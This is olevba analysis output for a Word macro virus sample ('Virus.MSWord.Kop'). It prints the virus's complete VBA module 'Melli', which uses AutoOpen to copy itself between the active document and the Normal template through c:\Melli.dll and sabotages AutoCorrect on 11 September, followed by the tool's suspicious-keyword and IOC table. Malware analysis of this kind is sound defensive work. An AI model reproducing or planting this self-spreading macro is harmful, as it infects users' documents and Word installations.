olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kop-4096b4f9c08dd409c01a035233c84946b7d44e16
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kop-4096b4f9c08dd409c01a035233c84946b7d44e16 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Melli.bas 
in file: Virus.MSWord.Kop-4096b4f9c08dd409c01a035233c84946b7d44e16 - OLE stream: 'Macros/VBA/Melli'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
If NormalTemplate.VBProject.VBComponents.Item("Melli").Name <> "Melli" Then
NotInNorm = True
ActiveDocument.VBProject.VBComponents("Melli").Export "c:\Melli.dll"
Set Dobj = NormalTemplate.VBProject
ElseIf ActiveDocument.VBProject.VBComponents.Item("Melli").Name <> "Melli" Then
NotInActiv = True
NormalTemplate.VBProject.VBComponents("Melli").Export "c:\Melli.dll"
Set Dobj = ActiveDocument.VBProject
End If
If NotInNorm = True Or NotInActiv = True Then Dobj.VBComponents.Import ("c:\Melli.dll")
If NotInActiv = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

If Day(Now()) = 11 And Month(Now()) = 9 Then
    AutoCorrect.Entries.Add Name:="and", Value:="Melli"
    AutoCorrect.ReplaceText = True
 End If

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Melli.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

